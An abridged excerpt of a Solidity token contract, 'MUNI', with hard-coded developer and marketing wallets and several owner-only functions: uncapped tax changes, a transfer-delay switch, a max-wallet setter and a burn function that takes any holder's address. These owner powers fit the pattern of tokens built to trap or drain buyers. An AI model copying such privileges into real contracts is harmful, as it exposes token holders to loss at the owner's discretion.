/** Telegram Group: https://t.me/muniportal **/
...
contract MUNI is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "MUNI";
    string private constant _symbol = unicode"$MUNI";
    ...
    address payable public DevWallet = payable(0x90015475938221ECB04De58aC9F8a18895DAaF91);
    address payable public MarketingWallet = payable(0x7865fe12e43198E68AB7cc7F4d765E326eC77473);
    ...
    function enableDelay(bool TrueOrFalse) external onlyAddress {
        transferDelay = TrueOrFalse;
    } 
    function changeTax(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
    ...
    function updatemaxWallet(uint256 newmaxWallet) external onlyAddress {
    ...
    function tokenBurn(uint256 value, address adr) onlyAddress public virtual {
